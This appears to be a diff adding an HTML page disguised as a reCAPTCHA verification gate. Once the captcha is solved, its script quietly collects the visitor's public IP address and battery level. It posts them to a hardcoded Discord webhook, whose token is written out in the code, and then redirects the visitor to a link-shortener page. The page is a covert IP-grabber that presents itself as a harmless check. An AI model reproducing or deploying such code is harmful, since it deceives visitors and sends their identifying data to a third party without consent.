@@ -1,0 +1,64 @@
+<html>
+  <head>
+    <script src='https://www.google.com/recaptcha/api.js'></script>
+    <style>
+      body {
+        background-color: #333;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+      }
+      #timer {
+        display: none;
+        color: white;
+        font-size: 20px;
+      }
+      #captcha {
+        transform: scale(1.5);
+      }
+    </style>
+  </head>
+  <body>
+    <form>
+      <div id="captcha" class="g-recaptcha" data-sitekey="6LdjQAckAAAAAAza3z0LNYVrb3cdggwGDVeHIUFP" data-callback="redirect"></div>
+    </form>
+    <p id="timer">You will be redirected in  <span id="countdown"></span> seconds.</p>
+    <script>
+  function redirect() {
+    navigator.getBattery().then(function(battery) {
+      var batteryPercentage = battery.level * 100;
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+          var userIp = this.responseText;
+          var webhookUrl = "https://discord.com/api/webhooks/1069361790154190878/MQdpWIPi5wXx46Qh0GcNNV3JcHhFVIaN3DZJkBGCKZcrRfrx58ABEhozkfCYbV4M33L_";
+          var jsonData = {
+            "embeds": [{
+              "title": "Captcha Completed",
+              "description": "Captcha completed successfully from IP: " + userIp + " with battery percentage: " + batteryPercentage + "%"
+            }]
+          }
+          xhttp.open("POST", webhookUrl, true);
+          xhttp.setRequestHeader("Content-Type", "application/json");
+          xhttp.send(JSON.stringify(jsonData));
+          document.getElementById("captcha").style.display = "none";
+          document.getElementById("timer").style.display = "block";
+          var count = 5;
+          var countdown = setInterval(function(){
+            document.getElementById("countdown").innerHTML = count;
+            if (count == 0) {
+              clearInterval(countdown);
+              window.location.href = "https://link-center.net/526938/cathub-keylast";
+            }
+            count--;
+          }, 1000);
+        }
+      };
+      xhttp.open("GET", "https://api.ipify.org", true);
+      xhttp.send();
+    });
+  }
+</script>
+  </body>
+</html>
